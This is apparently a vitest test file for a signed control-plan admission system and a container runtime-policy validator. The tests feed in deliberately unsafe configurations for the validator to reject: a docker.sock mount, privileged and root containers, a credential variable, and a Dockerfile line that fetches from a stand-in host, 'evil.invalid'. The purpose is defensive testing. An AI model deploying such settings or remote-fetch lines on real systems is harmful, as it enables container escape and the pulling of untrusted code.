import { generateKeyPairSync, sign } from "node:crypto";

import { describe, expect, it } from "vitest";

import {
  ControlPlanError,
  InMemoryControlPlanAdmissionJournal,
  admitSignedDynamicControlPlan,
  canonicalize,
  createSignedDynamicControlPlan,
  dispatchAdmittedControlPlan,
  evaluateRuntimeCapability,
  reconcileControlPlanAdmission,
  resolveRuntimeCoverage,
  revokeControlPlan,
  validateRuntimePolicy,
  verifySignedDynamicControlPlan,
} from "./src/index.js";
import type {
  ControlPlanAuthority,
  DynamicControl,
  DynamicControlPlanPayload,
  RuntimeBroker,
  TrustedControlPlanSigner,
} from "./src/index.js";

const NOW = "2026-07-28T10:00:00.000Z";
const EXPIRY = "2026-07-28T10:10:00.000Z";
const UPPER_EXPIRY = "2026-07-28T10:30:00.000Z";
const digest = (character: string): `sha256:${string}` => `sha256:${character.repeat(64)}`;

function fixture() {
  const { privateKey, publicKey } = generateKeyPairSync("ed25519");
  const control: DynamicControl = {
    plannedControlId: "control_home",
    safetyClass: "P1-anonymous-read",
    internalOrigin: { scheme: "http", host: "app", port: 8080 },
    method: "GET",
    routeTemplate: "/",
    fixtureIds: [],
    expectedSideEffects: ["none"],
    budgets: { requests: 2, bytes: "4096", requestsPerSecond: 1, wallSeconds: 10, redirects: 1 },
    permittedOutputClass: "O0",
    abortTriggers: ["unexpected-write"],
    cleanupAssertion: "no session remains",
    coverageOnDenyOrInterruption: "blocked",
  };
  const payload: DynamicControlPlanPayload = {
    schemaVersion: "1.0.0",
    controlPlanId: "control-plan-1",
    runId: "run_1",
    runtimeId: "runtime_1",
    runtimeCreationNonce: "creation-1",
    attemptId: "attempt_1",
    fenceToken: "7",
    snapshotId: "snapshot_1",
    compiledPlanId: "compiled_1",
    compiledPlanDigest: digest("a"),
    selectedProfileIds: ["profile-safe"],
    approvalIds: [],
    authorityDigest: digest("b"),
    internalOrigins: [{ scheme: "http", host: "app", port: 8080 }],
    controls: [control],
    probeProfileId: "probe-safe",
    issuedAt: NOW,
    expiresAt: EXPIRY,
    nonce: "plan-nonce-1",
  };
  const { budgets, ...releaseFields } = control;
  const authority: ControlPlanAuthority = {
    runId: payload.runId,
    runtimeId: payload.runtimeId,
    runtimeCreationNonce: payload.runtimeCreationNonce,
    attemptId: payload.attemptId,
    fenceToken: payload.fenceToken,
    snapshotId: payload.snapshotId,
    compiledPlanId: payload.compiledPlanId,
    compiledPlanDigest: payload.compiledPlanDigest,
    selectedProfileIds: payload.selectedProfileIds,
    approvalIds: payload.approvalIds,
    authorityDigest: payload.authorityDigest,
    internalOrigins: payload.internalOrigins,
    probeProfileId: payload.probeProfileId,
    releaseControls: new Map([
      [control.plannedControlId, { ...releaseFields, maximumBudgets: budgets }],
    ]),
    now: NOW,
    expiresAtUpperBound: UPPER_EXPIRY,
  };
  const signer: TrustedControlPlanSigner = {
    available: true,
    async signControlPlan(input) {
      const bytes = Buffer.concat([
        Buffer.from(input.domain, "utf8"),
        Buffer.from([0]),
        Buffer.from(input.canonicalPayload),
      ]);
      return {
        signatureAlgorithm: "Ed25519",
        signingKeyId: "test-only-key",
        signature: sign(null, bytes, privateKey).toString("base64"),
      };
    },
  };
  return { payload, authority, signer, publicKey };
}

async function signedFixture() {
  const value = fixture();
  const envelope = await createSignedDynamicControlPlan(
    value.payload,
    value.authority,
    value.signer,
  );
  return { ...value, envelope, pinnedKeys: new Map([["test-only-key", value.publicKey]]) };
}

function expectCode(action: () => unknown, code: string): void {
  try {
    action();
    throw new Error("expected action to fail");
  } catch (error) {
    expect(error).toBeInstanceOf(ControlPlanError);
    expect((error as ControlPlanError).code).toBe(code);
  }
}

describe("signed dynamic control-plan authority", () => {
  it("creates, verifies, admits, and dispatches exact signed bytes", async () => {
    const value = await signedFixture();
    expect(verifySignedDynamicControlPlan(value)).toEqual(value.envelope);
    const journal = new InMemoryControlPlanAdmissionJournal();
    const admitted = await admitSignedDynamicControlPlan(value, journal);
    let observedInlineEnvelope = false;
    const broker: RuntimeBroker = {
      available: true,
      async probe(input) {
        observedInlineEnvelope =
          input.signedControlPlan !== admitted.envelope &&
          Object.isFrozen(input.signedControlPlan.payload.controls[0]);
        expect(input.admission.state).toBe("admitted");
        return {
          controlPlanId: input.signedControlPlan.payload.controlPlanId,
          controlPlanDigest: input.signedControlPlan.payloadDigest,
          controlResultReceiptIds: ["receipt-1"],
        };
      },
    };
    await expect(
      dispatchAdmittedControlPlan(admitted, broker, journal, {
        authority: value.authority,
        pinnedKeys: value.pinnedKeys,
      }),
    ).resolves.toMatchObject({ controlResultReceiptIds: ["receipt-1"] });
    expect(observedInlineEnvelope).toBe(true);
  });

  it("fails closed on missing signer and native broker", async () => {
    const value = fixture();
    await expect(
      createSignedDynamicControlPlan(value.payload, value.authority, undefined),
    ).rejects.toMatchObject({
      code: "CONTROL_PLAN_SIGNER_UNAVAILABLE",
    });
    const signed = await signedFixture();
    const admitted = await admitSignedDynamicControlPlan(
      signed,
      new InMemoryControlPlanAdmissionJournal(),
    );
    await expect(
      dispatchAdmittedControlPlan(admitted, undefined, new InMemoryControlPlanAdmissionJournal(), {
        authority: signed.authority,
        pinnedKeys: signed.pinnedKeys,
      }),
    ).rejects.toMatchObject({
      code: "NATIVE_BROKER_UNAVAILABLE",
    });
  });

  it("rejects altered bytes, ID swaps, wrong keys, stale fences, and origin drift", async () => {
    const value = await signedFixture();
    const altered = structuredClone(value.envelope);
    altered.payload.nonce = "altered-nonce";
    expectCode(
      () =>
        verifySignedDynamicControlPlan({
          envelope: altered,
          authority: value.authority,
          pinnedKeys: value.pinnedKeys,
        }),
      "CONTROL_PLAN_DIGEST_MISMATCH",
    );

    const idSwap = structuredClone(value.envelope);
    idSwap.payload.compiledPlanId = "compiled-other";
    expectCode(
      () =>
        verifySignedDynamicControlPlan({
          envelope: idSwap,
          authority: value.authority,
          pinnedKeys: value.pinnedKeys,
        }),
      "CONTROL_PLAN_AUTHORITY_MISMATCH",
    );

    const staleAuthority = { ...value.authority, fenceToken: "8" };
    expectCode(
      () =>
        verifySignedDynamicControlPlan({
          envelope: value.envelope,
          authority: staleAuthority,
          pinnedKeys: value.pinnedKeys,
        }),
      "CONTROL_PLAN_AUTHORITY_MISMATCH",
    );

    const driftAuthority = {
      ...value.authority,
      internalOrigins: [{ scheme: "http" as const, host: "replacement", port: 8080 }],
    };
    expectCode(
      () =>
        verifySignedDynamicControlPlan({
          envelope: value.envelope,
          authority: driftAuthority,
          pinnedKeys: value.pinnedKeys,
        }),
      "CONTROL_PLAN_AUTHORITY_MISMATCH",
    );

    const secondKeys = generateKeyPairSync("ed25519");
    expectCode(
      () =>
        verifySignedDynamicControlPlan({
          envelope: value.envelope,
          authority: value.authority,
          pinnedKeys: new Map([["test-only-key", secondKeys.publicKey]]),
        }),
      "CONTROL_PLAN_SIGNATURE_INVALID",
    );
  });

  it("rejects replay and result/admission swaps", async () => {
    const value = await signedFixture();
    const journal = new InMemoryControlPlanAdmissionJournal();
    const admitted = await admitSignedDynamicControlPlan(value, journal);
    await expect(admitSignedDynamicControlPlan(value, journal)).rejects.toMatchObject({
      code: "CONTROL_PLAN_REPLAY",
    });

    const badBroker: RuntimeBroker = {
      available: true,
      async probe() {
        return {
          controlPlanId: "other-plan",
          controlPlanDigest: value.envelope.payloadDigest,
          controlResultReceiptIds: [],
        };
      },
    };
    await expect(
      dispatchAdmittedControlPlan(admitted, badBroker, journal, {
        authority: value.authority,
        pinnedKeys: value.pinnedKeys,
      }),
    ).rejects.toMatchObject({ code: "CONTROL_PLAN_RESULT_SWAP" });
  });

  it("revokes and reconciles only identical current-fence admissions", async () => {
    const value = await signedFixture();
    const journal = new InMemoryControlPlanAdmissionJournal();
    const admitted = await admitSignedDynamicControlPlan(value, journal);
    const identity = {
      controlPlanId: admitted.admission.controlPlanId,
      payloadDigest: admitted.admission.payloadDigest,
      runId: admitted.admission.runId,
      runtimeId: admitted.admission.runtimeId,
      runtimeCreationNonce: admitted.admission.runtimeCreationNonce,
      attemptId: admitted.admission.attemptId,
      fenceToken: admitted.admission.fenceToken,
      snapshotId: admitted.admission.snapshotId,
      compiledPlanId: admitted.admission.compiledPlanId,
      compiledPlanDigest: admitted.admission.compiledPlanDigest,
      selectedProfileIds: admitted.admission.selectedProfileIds,
      approvalIds: admitted.admission.approvalIds,
      authorityDigest: admitted.admission.authorityDigest,
      probeProfileId: admitted.admission.probeProfileId,
      internalOrigins: admitted.admission.internalOrigins,
    };
    await expect(reconcileControlPlanAdmission(journal, identity, NOW)).resolves.toBe("reattached");
    await expect(
      reconcileControlPlanAdmission(
        journal,
        { ...identity, runtimeCreationNonce: "restart-2" },
        NOW,
      ),
    ).resolves.toBe("revoked");
    await expect(
      dispatchAdmittedControlPlan(
        admitted,
        {
          available: true,
          async probe() {
            throw new Error("must not dispatch");
          },
        },
        journal,
        { authority: value.authority, pinnedKeys: value.pinnedKeys },
      ),
    ).rejects.toMatchObject({ code: "CONTROL_PLAN_ADMISSION_MISSING" });

    const fresh = await signedFixture();
    const freshJournal = new InMemoryControlPlanAdmissionJournal();
    await admitSignedDynamicControlPlan(fresh, freshJournal);
    await revokeControlPlan(freshJournal, fresh.payload.controlPlanId, NOW, "runtime-stop");
    expect((await freshJournal.findByPlanId(fresh.payload.controlPlanId))?.state).toBe("revoked");

    const expiring = await signedFixture();
    const expiryJournal = new InMemoryControlPlanAdmissionJournal();
    const expiryAdmission = await admitSignedDynamicControlPlan(expiring, expiryJournal);
    await expect(
      reconcileControlPlanAdmission(
        expiryJournal,
        {
          controlPlanId: expiryAdmission.admission.controlPlanId,
          payloadDigest: expiryAdmission.admission.payloadDigest,
          runId: expiryAdmission.admission.runId,
          runtimeId: expiryAdmission.admission.runtimeId,
          runtimeCreationNonce: expiryAdmission.admission.runtimeCreationNonce,
          attemptId: expiryAdmission.admission.attemptId,
          fenceToken: expiryAdmission.admission.fenceToken,
          snapshotId: expiryAdmission.admission.snapshotId,
          compiledPlanId: expiryAdmission.admission.compiledPlanId,
          compiledPlanDigest: expiryAdmission.admission.compiledPlanDigest,
          selectedProfileIds: expiryAdmission.admission.selectedProfileIds,
          approvalIds: expiryAdmission.admission.approvalIds,
          authorityDigest: expiryAdmission.admission.authorityDigest,
          probeProfileId: expiryAdmission.admission.probeProfileId,
          internalOrigins: expiryAdmission.admission.internalOrigins,
        },
        "2026-07-28T10:11:00.000Z",
      ),
    ).resolves.toBe("revoked");
  });

  it("rejects release-catalog and budget expansion before signing", async () => {
    const value = fixture();
    const expanded = structuredClone(value.payload);
    expanded.controls[0]!.budgets.requests = 999;
    await expect(
      createSignedDynamicControlPlan(expanded, value.authority, value.signer),
    ).rejects.toMatchObject({
      code: "CONTROL_PLAN_POLICY",
    });
  });

  it("enforces absolute safety maxima even when the catalog repeats unsafe values", async () => {
    const value = fixture();
    const expanded = structuredClone(value.payload);
    expanded.controls[0]!.budgets = {
      requests: 501,
      bytes: "999999999999999999999",
      requestsPerSecond: 999,
      wallSeconds: 99999,
      redirects: 999,
    };
    const releaseControl = value.authority.releaseControls.get("control_home");
    expect(releaseControl).toBeDefined();
    const unsafeAuthority = {
      ...value.authority,
      releaseControls: new Map([
        [
          "control_home",
          {
            ...releaseControl!,
            maximumBudgets: expanded.controls[0]!.budgets,
          },
        ],
      ]),
    };
    await expect(
      createSignedDynamicControlPlan(expanded, unsafeAuthority, value.signer),
    ).rejects.toMatchObject({ code: "CONTROL_PLAN_POLICY" });
  });

  it("rejects post-admission mutation before broker dispatch", async () => {
    const value = await signedFixture();
    const journal = new InMemoryControlPlanAdmissionJournal();
    const admitted = await admitSignedDynamicControlPlan(value, journal);
    expect(Object.isFrozen(admitted.envelope.payload.controls[0])).toBe(true);
    const mutatedEnvelope = structuredClone(admitted.envelope);
    mutatedEnvelope.payload.controls[0]!.routeTemplate = "/mutated-after-admission";
    let brokerCalled = false;
    await expect(
      dispatchAdmittedControlPlan(
        { envelope: mutatedEnvelope, admission: admitted.admission },
        {
          available: true,
          async probe() {
            brokerCalled = true;
            throw new Error("must not dispatch");
          },
        },
        journal,
        { authority: value.authority, pinnedKeys: value.pinnedKeys },
      ),
    ).rejects.toBeInstanceOf(ControlPlanError);
    expect(brokerCalled).toBe(false);
  });

  it("uses deterministic RFC 8785-style canonical ordering", () => {
    expect(
      Buffer.from(canonicalize({ z: 1, a: ["x", { b: true, a: null }] })).toString("utf8"),
    ).toBe('{"a":["x",{"a":null,"b":true}],"z":1}');
  });
});

describe("runtime policy and static-only gate", () => {
  it("strictly rejects privilege, socket, host port, escaping reference, and mutable image", () => {
    const result = validateRuntimePolicy({
      services: {
        app: {
          privileged: true,
          image: "example/app:latest",
          ports: ["8080:80"],
          volumes: ["/var/run/docker.sock:/var/run/docker.sock"],
          build: { context: "../outside" },
        },
      },
    });
    expect(result).toEqual({
      accepted: false,
      rejectionCodes: [
        "BIND_OR_SOCKET_MOUNT_FORBIDDEN",
        "HOST_PORT_FORBIDDEN",
        "MUTABLE_IMAGE_FORBIDDEN",
        "PRIVILEGED_FORBIDDEN",
        "REMOTE_OR_ESCAPING_REFERENCE",
      ],
    });
  });

  it("strictly rejects root, DNS, sysctls, credentials, external/custom networks, and unknown fields", () => {
    const result = validateRuntimePolicy({
      services: {
        app: {
          image: `registry.example/app@sha256:${"a".repeat(64)}`,
          user: "0",
          dns: ["8.8.8.8"],
          sysctls: { "net.ipv4.ip_forward": "1" },
          environment: { PROD_TOKEN: "sentinel" },
          deploy: { replicas: 1_000_000 },
          x_arbitrary_isolation_field: true,
        },
      },
      networks: { default: { external: true, driver: "macvlan" } },
    });
    expect(result).toEqual({
      accepted: false,
      rejectionCodes: [
        "CREDENTIAL_ENVIRONMENT_FORBIDDEN",
        "CUSTOM_DNS_FORBIDDEN",
        "CUSTOM_NETWORK_DRIVER_FORBIDDEN",
        "EXTERNAL_NETWORK_FORBIDDEN",
        "REPLICA_LIMIT_EXCEEDED",
        "ROOT_OR_NON_NUMERIC_USER_FORBIDDEN",
        "UNKNOWN_ISOLATION_FIELD",
        "UNSAFE_SYSCTL_FORBIDDEN",
      ],
    });
  });

  it("rejects remote Dockerfile ADD and excessive per-service or total resources", () => {
    const image = `registry.example/app@sha256:${"a".repeat(64)}`;
    const remoteBuild = validateRuntimePolicy({
      services: {
        app: {
          image,
          build: {
            context: ".",
            dockerfile_inline: "FROM scratch\nUSER root\nADD https://evil.invalid/x /x",
          },
        },
      },
    });
    expect(remoteBuild).toMatchObject({ accepted: false });
    if (!remoteBuild.accepted) {
      expect(remoteBuild.rejectionCodes).toEqual([
        "REMOTE_DOCKERFILE_ADD_FORBIDDEN",
        "ROOT_USER_FORBIDDEN",
      ]);
    }

    const excessive = validateRuntimePolicy({
      services: {
        app: {
          image,
          deploy: {
            replicas: 1,
            resources: { limits: { cpus: "2", memory: "3GiB", pids: 300 } },
          },
        },
      },
    });
    expect(excessive).toEqual({
      accepted: false,
      rejectionCodes: ["RESOURCE_LIMIT_EXCEEDED"],
    });
  });

  it("continues static assessment with explicit blocked dynamic controls", () => {
    const capability = evaluateRuntimeCapability({
      runtimeCapabilityId: "cap-1",
      runId: "run_1",
      snapshotId: "snapshot_1",
      nativeArchitecture: "arm64",
      verifiedSnapshot: true,
      policyCompilable: true,
      plannedControls: [{ plannedControlId: "control_home" }],
      browserRequired: true,
      browser: { chromium: "blocked" },
      limitsProfileId: "limits-default",
    });
    expect(capability.state).toBe("blocked");
    expect(resolveRuntimeCoverage(capability, ["control_home"])).toEqual({
      staticAssessment: "continues",
      dynamicCoverage: "blocked",
      controlResults: [
        {
          plannedControlId: "control_home",
          status: "blocked",
          reasonCode: "RUNTIME_ATTESTATION_MISSING",
          reason: "Trusted native runtime attestation is unavailable.",
        },
      ],
    });
  });
});
